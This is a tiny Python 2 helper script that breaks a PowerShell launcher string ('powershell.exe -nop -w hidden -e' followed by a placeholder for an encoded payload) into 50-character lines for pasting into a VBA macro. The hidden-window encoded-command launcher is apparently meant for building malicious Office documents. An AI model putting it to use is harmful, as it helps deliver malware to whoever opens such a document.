str = "powershell.exe -nop -w hidden -e PUT_YOUR_ENCODED_POWERSHELL_PAYLOAD_HERE"

n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'


